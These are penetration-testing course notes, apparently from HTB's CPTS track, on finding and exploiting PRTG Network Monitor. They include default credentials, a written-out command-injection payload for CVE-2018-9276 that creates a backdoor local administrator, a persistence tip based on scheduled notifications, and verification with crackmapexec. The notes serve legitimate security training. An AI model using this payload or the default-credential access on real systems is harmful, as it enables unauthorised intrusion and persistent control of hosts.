# PRTG Network Monitor (CPTS Notes)

## Overview
- **PRTG Network Monitor** — agentless network monitoring software by **Paessler** (monitoring solutions since 1997)
- Monitors **bandwidth, uptime, and statistics** from routers, switches, servers, etc.
- First released **2003**; **free version** (100 sensors / 20 hosts) released **2015**
- Uses **autodiscovery mode** to scan network segments and build a device list
- Gathers data via **ICMP, SNMP, WMI, NetFlow**, and more
- Runs as an **AJAX-based web app**; desktop clients available for Windows/Linux/macOS
- Also supports a **REST API** for device communication

### Stats
- ~**300,000 users worldwide**
- Notable users: **Naples International Airport, Virginia Tech, 7-Eleven**
- **26 CVEs** historically, but only **4** have easy public PoCs:
  - 2× **XSS**
  - 1× **Denial of Service**
  - 1× **Authenticated command injection** (covered below)
- Rare externally, **common on internal pentests**
- Featured in the HTB box **Netmon**

## Discovery / Footprinting / Enumeration

### Ports
Commonly found on **80, 443, or 8080** (web interface port is configurable in Setup when logged in as admin).

### Nmap Detection
```
junior-security-analyst@htb[/htb]$ sudo nmap -sV -p- --open -T4 10.129.201.50
```
```
8080/tcp open  http  Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
```

### EyeWitness / Default Credentials
- Default creds: **`prtgadmin:prtgadmin`** — often **pre-filled on the login page**, and frequently left unchanged
- EyeWitness and vulnerability scanners (e.g., **Nessus**) have plugins that detect and flag PRTG instances

### Confirming via Browser
```
http://10.129.201.50:8080/index.htm
```

### Version Fingerprinting via cURL
```
junior-security-analyst@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
```

### Login
- Default creds `prtgadmin:prtgadmin` may fail — try common weak passwords
- Example success: `prtgadmin:Password123`

## Leveraging Known Vulnerabilities — CVE-2018-9276

**Type:** Authenticated **command injection**
**Affects:** PRTG System Administrator web console **before version 18.2.39**
**Root cause:** The **Parameter field** when creating a new notification is passed **directly into a PowerShell script** with no input sanitization

> Discovered and documented in detail by the original researcher's blog post.

### Exploitation Steps

1. Navigate: **Setup → Account Settings → Notifications**
```
http://10.129.201.50:8080/myaccount.htm?tabid=2
```

2. Click **Add new notification**
```
http://10.129.201.50:8080/editnotification.htm?id=new&tabid=1
```

3. Configure:
   - Give it a name (e.g., `pwn`)
   - Tick **EXECUTE PROGRAM**
   - **Program File:** select `Demo exe notification - outfile.ps1`
   - **Parameter field:** inject command, e.g.:
     ```
     test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
     ```
   - *(On a real assessment, prefer something non-destructive — e.g., reverse shell / C2 callback — over creating a new admin user)*
   - Click **Save**

4. New notification appears in the **Notifications** list, marked active

5. **Persistence tip:** Notifications can be **scheduled** to run at a specific time daily — useful for maintaining access/reconnecting on long engagements

6. Click **Test** to trigger execution
   - Produces popup: *"EXE notification is queued up"*
   - **This is blind command execution** — no direct feedback
   - Verify success via: listener catch, or by checking the resulting access directly

### Confirming Success
```
junior-security-analyst@htb[/htb]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```
```
SMB  10.129.201.50  445  APP03  [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```
→ **Confirmed local admin access**

### Follow-On Access Options
- RDP
- WinRM (e.g., **evil-winrm**)
- Impacket tools: **wmiexec.py**, **psexec.py**

## Key Takeaways
- PRTG is almost always found via **default creds** (`prtgadmin:prtgadmin`) or close variants — check EyeWitness/Nessus output first
- **CVE-2018-9276** (notification Parameter field → PowerShell injection) is the go-to exploitation path for versions < 18.2.39
- Exploitation requires **authenticated access** — but default/weak creds make this trivial in practice
- Execution is **blind** — plan verification via CrackMapExec, a listener, or follow-up remote access tooling
- Prefer non-destructive payloads (reverse shell/C2) over creating admin accounts during real engagements
- **Next in track:** Customer service management and configuration management tools
